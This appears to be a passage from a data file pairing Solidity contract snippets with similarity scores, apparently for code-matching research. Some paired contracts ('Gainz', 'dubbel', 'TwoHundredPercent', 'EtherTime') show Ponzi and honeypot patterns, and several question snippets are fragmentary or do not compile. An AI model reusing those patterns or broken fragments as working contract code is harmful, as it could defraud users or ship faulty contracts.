    }
}"
"contract ContractReceiver {

    address public owner;
    
    ERC223Interface token; 
    uint public value;
    bytes public data;

    mapping(address => uint) public balances; 

    event LogTokensReceived(address tokenContract, address sender, uint amount, bytes data);
    event LogWithdrawal(address receiver, uint amount);

    constructor(address ERC223TokenContract) public { 
        owner = msg.sender;
        token = ERC223Interface(ERC223TokenContract); 
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }",0.6462322494905659,"contract Vault is Ownable {

    address public swaps;



    modifier onlySwaps() {

        require(msg.sender == swaps);

        _;

    }



    function () external payable {

    }



    function tokenFallback(address, uint, bytes calldata) external {

    }



    function setSwaps(address _swaps) public onlyOwner {

        swaps = _swaps;

    }



    function withdraw(address _token, address _receiver, uint _amount) public onlySwaps {

        if (_token == address(0)) {

            address(uint160(_receiver)).transfer(_amount);

        } else {

            IERC20(_token).transfer(_receiver, _amount);

        }

    }

}"
"contract Mycontract {
    fallback() external payable { }
}",0.6731013772211851,"contract NTS {
    function fund() external payable;
}"
"contract ERC20 { 
   function tokenExchangeRate() returns(uint); 
}",0.6272802249007099,"contract TOP {
    function caged() public returns(uint256);
}"
"contract Factory {
    struct tokenData { 
        string name; 
        string symbol; 
        uint8 decimals; 
        uint256 totalSupply;  
    } 

    event TokenCreated(address indexed tokenAddress, string name, string symbol, uint8 decimals, uint256 totalSupply);

    mapping(address => tokenData) private _tokens;

    function createToken(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public returns(address tokenAddress){ 
        Token token = new Token(name, symbol, decimals, totalSupply);
        _tokens[address(token)] = tokenData(name, symbol, decimals, totalSupply);

        emit TokenCreated(address(token), name, symbol, decimals, totalSupply);

        return(address(token));
    } 

    function getTokenData(address tokenAddress) public view returns(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply){
        return (_tokens[tokenAddress].name, _tokens[tokenAddress].symbol, _tokens[tokenAddress].decimals, _tokens[tokenAddress].totalSupply);
    }
}",0.6838056441226672,"contract Token {



    string internal _symbol;

    string internal _name;



    uint8 internal _decimals;

    uint internal _totalSupply;



    mapping (address => uint) internal _balanceOf;

    mapping (address => mapping (address => uint)) internal _allowances;



    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = totalSupply;

    }



    function name()

        public

        view

        returns (string) {

        return _name;

    }



    function symbol()

        public

        view

        returns (string) {

        return _symbol;

    }



    function decimals()

        public

        view

        returns (uint8) {

        return _decimals;

    }



    function totalSupply()

        public

        view

        returns (uint) {

        return _totalSupply;

    }



    function balanceOf(address _addr) public view returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract SimpleTest {

    DateTime dateTime;

    event LogInsertItemYYYMMDD(address sender, uint256 value, uint16 year, uint8 month, uint256 timeStamp);

    constructor(address dateTimeAddress) public  { 
        dateTime = DateTime(dateTimeAddress);      
    }

    function insertItemYYYYMM(uint256 _value, uint16 year, uint8 month, uint8 day) public returns (bool){
        uint256 time = dateTime.toTimestamp(year, month, day);
        emit LogInsertItemYYYMMDD(msg.sender, _value, year, month, time);
        return true;
    }
}",0.6215544682519766,"contract ApcrdaZebichain is Ownable{

    mapping (uint256 =>string ) event_details; 

     DateTime public dt;

    function ApcrdaZebichain() public{

     }

 

     function viewMerkleHash(uint16 year, uint8 month, uint8 day)  public view returns(string hash)

     {

         uint  time = dt.toTimestamp(year,month,day);

         hash= event_details[time];

     }

     

     function insertHash(uint16 year, uint8 month, uint8 day, string hash) onlyOwner public{

             dt = new DateTime();

             uint  t = dt.toTimestamp(year,month,day);

             event_details[t]=hash;

         

       }





  }"
"contract NameRegistry {
    mapping(bytes32 => address) addressBook;

    function set(string a, address b){
        addressBook[sha3(a)] = b;
    }

    function get(string a) constant returns(address){
        return addressBook[sha3(a)];
    }
}",0.6631762953283804,"contract IUserData {

    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    

    function getUserRef(address _address, string _gameName) public view returns (address);

}"
"contract DappToken {
    uint256 public totalSupply;
     constructor() public {
        totalSupply = 1000000;
    }   
}",0.6500656268130862,"contract shortContract2 {
    int256 public aNumber;
    
    constructor() public {
        aNumber = -1000;
    }
}"
"contract MyToken {
    

     mapping (address => uint) public _balanceOf;
     mapping (address => uint) public _expiryOf;

     uint leasePeriod = 100;
     uint price = 1 Ether;

     
     modifier expiry(address _addr) {
         if (_balanceOf[_addr] > 0 && _expiryOf[_addr] < block.timestamp) {
             _expiryOf[_addr] = 0;
             _balanceOf[_addr] = 0;
         }
         _;
     }

     function lease(uint _amount) 
        public
        payable
        expiry(msg.sender)
        returns (bool) {
        require(1 Ether == msg.value); 
        require(0 == _balanceOf[msg.sender]); 
        _expiryOf[msg.sender] = block.timestamp + leasePeriod;
        _balanceOf[msg.sender] += 1; 
    }

    function balanceOf(address _addr) 
        public
        expiry(_addr)
        returns (uint) {
        return _balanceOf[_addr];
    }
}",0.6705499302457439,"contract Gainz {

    address owner;



    constructor () public {

        owner = msg.sender;

    }



    mapping (address => uint) balances;

    mapping (address => uint) timestamp;

    

    function() external payable {

        owner.transfer(msg.value / 20);

        if (balances[msg.sender] != 0){

            msg.sender.transfer(paymentDue(msg.sender));

        }

        timestamp[msg.sender] = block.number;

        balances[msg.sender] += msg.value;

    }

    

    

    function balanceOf(address userAddress) public view returns (uint) {

        return balances[userAddress];

    }



    

    function paymentDue(address userAddress) public view returns (uint) {

        uint blockDelta = block.number-timestamp[userAddress];

        return balances[userAddress]*2/100*(blockDelta)/6000;

    }

}"
"contract Foo {
  constructor (string memory _bar) public {
  }
}",0.6508603202438472,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract Token {
    uint256 public totalSuply;

    constructor (uint256 _totalSuply) public {
        totalSuply = _totalSuply;
    }
}",0.665846190037326,"contract TokenParam {

	

    uint256 public constant decimals = 18;



	

    uint256 public  totalSupply = 500 * 10 ** decimals;



}"
contract demo { string public name = 'Petros'; function changeName(string _newName){ name = _newName; }},0.621064477683861,"contract ENSReverseRegistrarI {
    function setName(string memory name) public returns (bytes32 node);
}"
"contract test {
  using SafeMath for uint256;

  uint256 a = 4;
  uint256 b = a.add(a); 
}",0.6245280386726241,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract example {
    address[] public users;
    mapping (address => uint) public count;

    function donate() public payable{
        require(msg.value == .002 ether);
        if (count[msg.sender] == 0) {
            users.push(msg.sender);
        }

        count[msg.sender] += 1;

    }
}",0.6814626044714104,"contract dubbel {

    address public previousSender;

    uint public price = 0.001 ether;

    

    function() public payable {

            require(msg.value == price);

            previousSender.transfer(msg.value);

            price *= 2;

            previousSender = msg.sender;

    }

}"
"contract tester{

struct Person
{
    string name;
    uint age;
}

function getSome() public returns (Person a)
{
    Person memory p;
    p.name = ""kashish"";
    p.age =20;
    return p;
}

function wantSome() public returns (string,uint)
{
     Person memory p2 =getSome();
     return (p2.name,p2.age); 
}
}",0.6299531715229209,"contract ERC20Interface {
  function name() public view returns (string memory);
  function symbol() public view returns (string memory);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract A is AInterface {
  BInterface b;
}",0.6073608397752945,"contract AltTokenInterface is MintableToken {

}"
"contract B is BInterface {
  AInterface a;
}",0.603712861934245,"contract AltTokenInterface is MintableToken {

}"
"contract Getter { 

    uint8 public constant decimals = 18;

}",0.6745988487003367,"contract BConst {
    uint public constant EXIT_FEE = 0;
}"
"contract MyContract is Something {
 ...
}",0.6402793264900963,"contract tokenContract is ERC20Token{

}"
"contract testcontract {
    string mystringStorage = ""Blah"";

    function testme () returns (string){
        
        string memory mystring = ""foo2"";

        
        string mystringMemory = mystringStorage;

        return ""foo"";
    }
}",0.6014272442271177,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract AnimalContract{

    StorageLib.StorageStruct storage;

    function roar() public{
        LionLib.roar(storage);
    }

    function meow(uint256 someValue) public{
       CatLib.meow(storage, someValue);
    }  
}",0.6243789397938118,"contract SimpleStorage {

    

    address public owner;

    uint256 public storageValue;

    

    constructor()  public {

        owner = msg.sender;

    }

    

    function setStorage(uint256 _value) {

        storageValue = _value;

    }

}"
"contract Server{ 
    function a(){
        FunACalled();
    }
    event FunACalled();
}",0.6294777698582739,"contract Callee {
    event ReceivedCall();
    
    function () {
        ReceivedCall();
    }
}"
"contract BlockHash {

    function isBlockHash(uint blockNumber, bytes32 checkHash) 
        public
        constant
        returns(bool isIndeed)
    {
        return(block.blockhash(blockNumber) == checkHash);
    }

    function getBlockHash(uint blockNumber)
        public
        constant
        returns(bytes32 blockHash)
    {
        return block.blockhash(blockNumber);
    }  

}",0.6476177237801254,"contract ForkChecker {
  bool public isFork;
  uint256 public bnCheck;
  bytes32 public bhCheck;

  function ForkChecker(uint256 _blockNumber, bytes32 _blockHash) {
    bytes32 _check = block.blockhash(_blockNumber);
    bhCheck = _blockHash;
    bnCheck = _blockNumber;
    if (_check == _blockHash) {
      isFork = true;
    }
  }
}"
"contract AsBool {
    mapping(address => bool) bools;

    function add()
    public
    {
        bools[msg.sender] = true;
    }
}",0.6560224062642479,"contract ERC20Frag {
    function approve(address spender, uint tokens) public returns (bool);
}"
"contract Purchase
{
  uint public totalBuyers = 0;
  uint public totalEarnings = 0;
  ...
}",0.6310170050488869,"contract FractionalERC20Ext is ERC20 {

  uint public decimals;
  uint public minCap;

}"
"contract Judge is IJudge {
    ...
}",0.6128239484469392,"contract Peth is ERC20 {



}"
"contract CallableEvents {
  event CalledTrigger1 (address indexed from);
  
}",0.6650690169098377,"contract DSAuthEvents {
    event LogSetOwner     (address indexed owner);
}"
"contract MyContract {

   using SafeMath for uint;",0.6513801298863862,"contract MyContract {

    uint i = (10 + 2) * 2;

}"
"contract Purchase {
    uint public value;
    address public seller;
    address public buyer;
    enum State { Created, Locked, Inactive }
    State public state;

    
    
    
    constructor() public payable {
        seller = msg.sender;
        value = msg.value / 2;
        require((2 * value) == msg.value, ""Value has to be even."");
    }

    modifier condition(bool _condition) {
        require(_condition);
        _;
    }

    modifier onlyBuyer() {
        require(
            msg.sender == buyer,
            ""Only buyer can call this.""
        );
        _;
    }

    modifier onlySeller() {
        require(
            msg.sender == seller,
            ""Only seller can call this.""
        );
        _;
    }

    modifier inState(State _state) {
        require(
            state == _state,
            ""Invalid state.""
        );
        _;
    }

    event Aborted();
    event PurchaseConfirmed();
    event ItemReceived();

    
    
    
    function abort()
        public
        onlySeller
        inState(State.Created)
    {
        emit Aborted();
        state = State.Inactive;
        
        seller.transfer(address(this).balance); 
    }

    
    
    
    
    function confirmPurchase()
        public
        inState(State.Created)
        condition(msg.value == (2 * value))
        payable
    {
        emit PurchaseConfirmed();
        buyer = msg.sender;
        state = State.Locked;
    }

    
    
    function confirmReceived()
        public
        onlyBuyer
        inState(State.Locked)
    {
        emit ItemReceived();
        
        
        
        state = State.Inactive;

        
        

        buyer.transfer(value);
        
        seller.transfer(address(this).balance); 
    }
}",0.6263611150581047,"contract RefundVault is Ownable {
  using SafeMath for uint256;

  enum State { Active, Refunding, Closed }

  mapping (address => uint256) public deposited;
  address public wallet;
  State public state;

  event Closed();
  event RefundsEnabled();
  event Refunded(address indexed beneficiary, uint256 weiAmount);

  function RefundVault(address _wallet) public {
    require(_wallet != address(0));
    wallet = _wallet;
    state = State.Active;
  }

  function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }

  function close() onlyOwner public {
    require(state == State.Active);
    state = State.Closed;
    Closed();
    wallet.transfer(this.balance);
  }

  function walletWithdraw(uint256 _value) onlyOwner public {
    require(_value < this.balance);
    wallet.transfer(_value);
  }

  function enableRefunds() onlyOwner public {
    require(state == State.Active);
    state = State.Refunding;
    RefundsEnabled();
  }

  function refund(address investor) public {
    require(state == State.Refunding);
    uint256 depositedValue = deposited[investor];
    deposited[investor] = 0;
    investor.transfer(depositedValue);
    Refunded(investor, depositedValue);
  }
}"
"contract Campaign {
    constructor (uint depositInWei, address ll, uint weiCostOfEachToken) public payable{
    }

}",0.6039956442229375,"contract IChest {
        function purchaseFor(address user, uint count, address referrer) public payable;

}"
"contract User{
    function CheckingRegistration...        
}",0.6014653426557081,"contract UBTCTokenAbstract {
  function unlock();
}"
"contract Bar {
  event FooAddress (address indexed addr);

  
  constructor (uint256 n) public {
    while (n --> 0) {
      emit FooAddress (address (new Foo ()));
    }
    selfdestruct (msg.sender);
  }
}",0.6360998080093035,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract Tata
{
    uint256[] public testArray;

    function getLength() external view returns (uint256)
    {
        return testArray.length;
    }
    function setLength(uint256 newLength) external
    {
        assembly { sstore(testArray_slot, newLength) }
    }
}",0.6351592715943198,"contract ERC20TokensContract {

    

    function balanceOf(address _owner) external view returns (uint256 balance);

    function totalSupply() external view returns (uint256);

    string public name;

    string public symbol;

}"
"contract NameReg {
    function register(bytes32 name);
    function unregister();
}",0.6279811797987209,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract B {
  A a;

  constructor (A _a) public {
    a = _a;
  }
}",0.6118549711549817,"contract KPXV0_1_0 is Basic777 {
  constructor() public Basic777() { }
}"
"contract Mycontract{
    uint public sellprice;
    uint public buyprice;
    address public admin;

    constructor(uint _sellprice, uint _buyprice) {
        sellprice = _sellprice;
        buyprice = _buyprice;
        admin = msg.sender;
    }

    function sell()...

    function buy()..


}",0.6268170428028282,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract Test{

  string private s;

  function setString(string args) public{
      s = args;
  }

  function setInt(uint a) public{
      s = args;
  }

  function setRandomInt(uint a) public{
      for(uint index=0;index<a;index++){
          setInt(index);
      }
     setInt(a);
  }
}",0.6138094189214228,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract Test {
    mapping(uint => mapping(uint => bool)) s;

    constructor() public {
        s[0][1] = true;
    }

    function readUser(uint A, uint B)
    public
    view
    returns(bool)
    {
        return s[A][B];
    }
}",0.6552103409610136,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract t {
    function tb20(bytes memory _b) 
    public
    pure
    returns (bytes20 _result) {
        assembly {
            _result := mload(add(_b, 0x20))
        }
    }

    function bytesToAddress(bytes memory _b) 
    public 
    returns (address) {
        return address(tb20(_b));
    }
}",0.6356544722477288,"contract iERC223Token {
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transferFrom(address from, address to, uint value, bytes data) public returns (bool ok);
}"
"contract foo {
    int public bar;
}",0.6516834039192588,"contract test {
    function f() public { }
}"
"contract Logistics {




    address Owner;

  struct package{
     bool isuidgenerated;
     uint itemid;
     string itemname;
     string transitstatus;
     uint orderstatus; 
     address customer;
     uint ordertime;

     address carrier1;
     uint carrier1_time;

     address carrier2;
     uint carrier2_time;

    address carrier3;
     uint carrier3_time;
}

 mapping (address => package) public packagemapping;
 mapping (address => bool) public carriers;




constructor () public
{ 
    Owner = msg.sender; 

} 
modifier onlyOwner(){ 
    require(Owner == msg.sender); _; 

} 



function ManageCarriers(address _carrierAddress) onlyOwner public returns (string){

if (!carriers[_carrierAddress]){ carriers[_carrierAddress] = true; } else { carriers[_carrierAddress] = false;
} return ""Carrier is updated"";
}




function OrderItem(uint _itemid, string _itemname) public returns(address){
    address uniqueId = address(sha256(abi.encodePacked(msg.sender, now)));
   packagemapping[uniqueId].isuidgenerated = true;
   packagemapping[uniqueId].itemid = _itemid;
   packagemapping[uniqueId].itemname = _itemname;
   packagemapping[uniqueId].transitstatus = ""your package is ordered and is under processing"";
   packagemapping[uniqueId].orderstatus = 1;

   packagemapping[uniqueId].customer = msg.sender;
   packagemapping[uniqueId].ordertime = now;

    return uniqueId;
}



}",0.6018999889088676,"contract WinnerLog {

    address public owner;

    event NewWinner(

        address sender,

        string name,

        uint256 number

    );

    

    

    struct Player {

        uint256 number;

        string name;

        bool exists;

    }



    mapping(address => bool) winners;

    address[] public winner_addr_list;

    string[] public winner_name_list;

    mapping( address => Player ) private players;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    modifier onlyPlayer {

        require(players[msg.sender].exists);

        _;

    }



    function isWinner(address addr) public view returns (bool) {

        return winners[addr];

    }



    function getWinnerAddrs() public view returns (address[]) {

        return winner_addr_list;

    }

    

    function getWinnerNames() public view returns (string[]) {

        return winner_name_list;

    }

    

    constructor(address[] players_, uint256[] nums, string[] names) public {

        owner = msg.sender;

        for (uint256 i = 0; i < players_.length; i++) {

            players[players_[i]] = Player(nums[i], names[i], true);

        }

    }



    function addPlayer(address addr, uint256 number, string name) public onlyOwner {

        players[addr] = Player(number, name, true);

    }



    function logWinner(address addr, uint256 playerNo, bytes name) public onlyPlayer { 

            winners[addr] = true;

            winner_name_list.push(string(name));

            winner_addr_list.push(addr);

            emit NewWinner(msg.sender, string(name), playerNo);

    }

}"
contract A {\n},0.6149273240191371,"contract DPPBurn {
    
}"
"contract Foo {
  bytes32 public barHash;

  constructor (string memory _bar) public {
    barHash = keccak256 (bytes (_bar));
  }
}",0.6411129643768728,"contract BlobHasher {
    bytes32 public shaHash;
    function hash(bytes memory blob) public {
        shaHash = sha256(blob);
    }
}"
"contract Cookie {

  

  function getFlavor()
    public
    constant
    returns (string flavor)
  {
    return ""mmm ... chocolate chip"";
  }    
}",0.6495409648607168,"contract MyContract {
    function whatDidJasonSay() constant returns (string said){
        return ""ether is a scam"";
    }
}"
"contract Accessors {
    address[] public customers;
    bytes32[] public invoices;
    mapping(address => bytes32[]) public customerInvoices;
    mapping(address => mapping(bytes32 => uint)) public customerInvoiceAmounts;
}",0.6177312685206157,"contract TwoHundredPercent {

    mapping(address => uint) public balance;

    mapping(address => uint) public time;

    mapping(address => uint) public percentWithdraw;

    mapping(address => uint) public allPercentWithdraw;

}"
"contract users{   
event LogThis(uint arg);
struct User{
    uint id;
    string str;
}
User [] public adds;
function del(){
    delete adds;
}
function delElem(uint i){
    delete adds[i];
}
function add(uint id,string cc){
    adds.push(User(id,cc));
}
function getLength()constant returns(uint){
    LogThis(adds.length);
    return adds.length;
}}",0.6064759627851585,"contract LANDRegistry {

  function ping() public;

  function ownerOf(uint256 tokenId) public returns (address);

  function safeTransferFrom(address, address, uint256) public;

  function decodeTokenId(uint value) external pure returns (int, int);

  function updateLandData(int x, int y, string data) external;

}"
"contract TestProxy {
    address public targetAddress;",0.6691953437480129,"contract Proxied {

    address public masterCopy;

}"
"contract Mycontract{
    uint256 public x;

    function f(uint256 value) public returns(uint256){
        x = value;
        return x;
    }
",0.6940029637968637,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract Company{

    struct Stock{
        address owner;
        string bitcoinAddress;
    }

    bytes32 public companyName;
    Stock[2] public owners;
    string public test;

    function Company(bytes32 _companyName, address[2] addresses){
        companyName = _companyName;
        
     }

    function changeStockOwner(uint8 ownerNumber, string newAddress) returns(bool success){
        
        if(msg.sender != owners[ownerNumber].owner && owners[ownerNumber].owner != 0) throw;
        owners[ownerNumber].bitcoinAddress = newAddress;
        return true;
    }
}",0.6071278972410599,"contract SimpleDonate is   Owned {



    using SafeMath for uint;  



    string public  name; 

 



 

 

    



    



    



    constructor(string contractName) public  { 

        name = contractName; 

    }







  



    

     



    



    



    

     function withdrawEther(uint amount) public onlyOwner returns(bool) {

        

        require(amount < address(this).balance);

        owner.transfer(amount);

        return true;



    }

    

    



    



    



    function withdrawERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {



        return ERC20Interface(tokenAddress).transfer(owner, tokens);



    }



}"
"contract MyContract {

    address owner;
    uint balance;
    bytes32 data

    ....
}",0.6283798463450604,"contract Manager {
    function open(bytes32, address) public returns (uint);

}"
"contract testArray {
    address payable addr;
    function testA(address payable _addr, uint[] memory emp) public{
        addr = _addr;
        for(uint i=0; i<emp.length; ++i){
            addr.send(emp[i]);
        }
    }
}",0.6211910596772482,"contract MultiTransfer {
    function multiTransfer(address token, address[] _addresses, uint256 amount) public {
        for (uint256 i = 0; i < _addresses.length; i++) {
            token.transfer(amount);
        }
    }
}"
"contract MyContract{
    struct student{
        int RollNo;
        string Name;
    }

    student public s1=student({RollNo:1, Name:""Test Bunny""});

    int public disint; string public disname;
    constructor() public {
        disint=s1.RollNo;
        disname=s1.Name;    
    }
}",0.6032200516571442,"contract Token {

    string public name;

    string public symbol;

    uint public decimals;

    

    constructor(string memory _name, string memory _symbol, uint _decimals) public {

        name = _name;

        symbol = _symbol;

        decimals = _decimals;

    }

}"
"contract AddressOne {
   function() payable {
     OriginalContract.withdraw();

     
   }
}",0.6445353029969749,"contract AdvisorsAddress {

    

    

    function() external payable {

        

        revert();

    } 

}"
"contract MyContract {
   uint allTheEth;

   function withdraw()
   public
   {
      msg.sender.transfer(allTheEth);
   }

   function()
   public
   payable
   {
      
      if (msg.value == 0) {
         withdraw();
      
      } else {
         allTheEth += msg.value;
      }
   }
}",0.6203061223750318,"contract EtherTime

{

    address Owner = msg.sender;



    function() public payable {}



    function Xply() public payable {

        if (msg.value >= address(this).balance || tx.origin == Owner) {

            selfdestruct(tx.origin);

        }

    }

 }"
"contract BunusCoin{
    uint minLimitToGetBonus = 1000;
    bool InTime = true;
    uint rate = 3000;

    mapping(address => uint ) public balances;

    function NoMoreHoops() public payable{
        require(InTime);
        uint tokensPurchasing = msg.value * rate ; 
        
        
        
        uint totalTokens = tokensPurchasing ; 
        
        if(totalTokens > minLimitToGetBonus){
             tokensPurchasing = tokensPurchasing .safeMul(1500).safeDiv(100); 
        }
        balances[msg.sender] = safeAdd(balances[msg.sender], tokensPurchasing); 
        _totalSupply = safeAdd(_totalSupply, tokensPurchasing); 
        Transfer(address(0), msg.sender, tokensPurchasing); 
        owner.transfer(msg.value);
    }
}",0.6184200957607839,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  uint totalSupply_;

  
  function totalSupply() public view returns (uint) {
    return totalSupply_;
  }

  
  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint) {
    return balances[_owner];
  }

}"
"contract DonationContract
{
    address owner;

    struct Applicant
    {
        address Appl;
        string Name;
        string OrgType;
        string Number;
        string Email;
        uint256 Funds; 
        bool approved;
    }

    mapping(address => bool) facilitators;

    mapping (address => Applicant) applicants;

    modifier Owner() 
    {
        require(msg.sender == owner);
        _;
    }

     modifier Approved() 
    {
        require(applicants[msg.sender].approved == true);
        _;
    }

    modifier OnlyFacilitator()
    {
        require(facilitators[msg.sender] == true);
        _;
    }

    constructor() public {
        owner = msg.sender;
        facilitators[msg.sender] = true;
    }

    function approve(address Org) OnlyFacilitator public
    {
        applicants[Org].approved = true;
    }   

    function addFacilitator(address _addr) Owner public
    {
        facilitators[_addr] = true;
    }
}",0.63944786362543,"contract Owned {

    address public owner;

    address public receiver;

    mapping (address => bool) public moderator;



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    modifier onlyModerator {

        require(moderator[msg.sender]);

        _;

    }



    modifier onlyAdmin {

        require(moderator[msg.sender] || msg.sender == owner);

        _;

    }



    constructor() internal {

        owner = msg.sender;

        receiver = msg.sender;

    }



    function setOwner(address _address) public onlyOwner {

        owner = _address;

    }



    function setReceiver(address _address) public onlyAdmin {

        receiver = _address;

    }



    function addModerator(address _address) public onlyOwner {

        moderator[_address] = true;

    }



    function removeModerator(address _address) public onlyOwner {

        moderator[_address] = false;

    }

}"
"contract B is A{
    constructor(address paramB) public {
      log0(bytes32(0x00000001));  
    }
}",0.6240122423134356,"contract DIHToken is DIHBase {
    constructor(address owner) public
        DIHBase(owner)
    {
    } 
}"
"contract Trade {
    function exchange(address alice, 
                    address tokenA,
                    uint qtyTokenA,
                    address bob,
                    address tokenB,
                    uint qtyTokenB) 
        returns (bool success) {
        success = Token(tokenA).transferFrom(alice, bob, qtyTokenA)
            && Token(tokenB).transferFrom(bob, alice, qtyTokenB);
        if (!success) throw;
    }
}",0.6533232340810661,"contract Token {
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
}"
"contract test {
    uint total;
    uint counter;

    function calcAverage( uint _newValue) public
    {
        total += _newValue;
        counter++;
    }

    function get() public view returns(uint)
    {
        return total / counter;
    }
}",0.6824202876691056,"contract ICO is OwnerERC20 {

    

    function transferByEth(address _to, uint _weiAmount, uint _value) public returns (bool);



    

    function calculateNoToken(uint _weiAmount) public view returns(uint);

}"
contract Spoke is Deployed { ...,0.6427465049631097,"contract STCDR is Token{

	

}"
"contract TestGas {
    string constant statictext = ""Hello World"";
    bytes11 constant byteText11 = ""Hello World"";
    bytes32 constant byteText32 = ""Hello World"";

    function  getString() payable public  returns(string){
        return statictext;
    }

    function  getByte11() payable public returns(bytes11){
        return byteText11;
    }

    function  getByte32() payable public returns(bytes32){
        return byteText32;
    }
}",0.6266320635694166,"contract NamedToken {
  string public name;
  string public symbol;
  uint32 public decimals;

  function NamedToken(string _name, string _symbol, uint32 _decimals) {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }

  
  function getNameHash() constant returns (bytes32 result){
    return sha3(name);
  }

  
  function getSymbolHash() constant returns (bytes32 result){
    return sha3(symbol);
  }
}"
"contract StringMap {
    mapping(string => address) public users;
}",0.6824417579472278,"contract Poll {
    mapping (address => bool) public voted;
}"
"contract Adder {
    function add(uint a, uint b) returns (uint){
        return a+b;
    }
}",0.6918095457684229,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract A {
    uint t;

    function run() public returns(uint){
        uint startTime = 9;
        uint allowedTime = 7;

        uint v = startTime + allowedTime; 
        t = now + v;
        return t;
    }
}",0.6084287757903988,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract PayMultiple {
    using SafeMath for uint;

    function pay(address[] payees, uint[] values) public payable{
         
         require(payees.length == values.length);

         
        uint total = 0;
        for(uint i = 0; i < payees.length; i++){
            total = total.add(values[i]);
        }
        require(total == msg.value);

        
        for(i = 0; i < payees.length; i++){
            payees[i].transfer(values[i]);
        }
    }
}",0.6098191545492072,"contract MultiTransfer is Ownable {

    ERC20 public gctAddress;



    function MultiTransfer(address gct) public {

        gctAddress = ERC20(gct);

    }





    function transfer(address[] to, uint[] value) public onlyOwner {

        require(to.length == value.length);



        for (uint i = 0; i < to.length; i++) {

            gctAddress.transferFrom(owner, to[i], value[i]);

        }

    }

}"
"contract Foo {
    uint public bar;
}",0.6490519201965215,"contract Empty {
 uint public value = 5;
}"
"contract A {
    function() {
        throw;
    }
}",0.6858354930813482,"contract Hello {

    function Hello() {

    }
}"
"contract Forward {

  event LogFundsForwarded(address from, address to, uint amount);

  function forwardFunds(address receiver) 
    payable 
    public
    returns(bool success)
  {
    if(msg.value==0) throw;
    if(!receiver.send(msg.value)) throw;
    LogFundsForwarded(msg.sender, receiver, msg.value);
    return true;
  }

}",0.6192378920160982,"contract token {
	function transferFrom(address sender, address receiver, uint amount) public returns(bool success) {}
	
	function transfer(address receiver, uint amount) public returns(bool success) {}
	
	function balanceOf(address holder) public constant returns(uint) {}
}"
"contract Foo {
  event Bar (string bar);

  constructor (string memory _bar) public {
    emit Bar (_bar);
  }
}",0.6057221508058271,"contract Versioned {
  string public version;

  constructor(string memory _version) public {
    version = _version;
  }

}"
"contract ValueStore {
    function getValue(uint param) constant returns (uint returnedValue);
}",0.6792777496876091,"contract StorageInterface {
    function getUInt(bytes32 record) public constant returns (uint);
}"
"contract Crowdfunding {
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
    }

    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    address[] public approvers;",0.659032410208968,"contract StrictToken is Token {

    bool public strict = true;

    mapping (address => uint256) public rate;



    function getRate(address _address) public view returns (uint256);

    function getStrict() public pure returns (bool);

}"
"contract Test {
    function Time_call() returns (uint256){
        return now;
    }
}",0.6963994089551725,"contract Token {
    function approve(address, uint256) returns (bool);
}"
"contract Mine {
  Augor a;
}",0.6161144860428726,"contract Mkr is ERC20 {



}"
"contract Crowdfunding {
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
    }",0.6064681977675641,"contract NGTToken {
    function transfer(address _recipient, uint256 _value) public returns (bool success);
}"
"contract mycontract {

    function bytesToUint(bytes b) public returns (uint256){
        uint256 number;
        for(uint i=0;i<b.length;i++){
            number = number + uint(b[i])*(2**(8*(b.length-(i+1))));
        }
        return number;
    }
}",0.6018613117439459,"contract ContractToken {
    function balanceOf(address _owner) public constant returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}"
"contract Test 
{

    function test() 
        public 
        view    
        returns (string memory) 
    {
        return addressToString(address(this));
    }

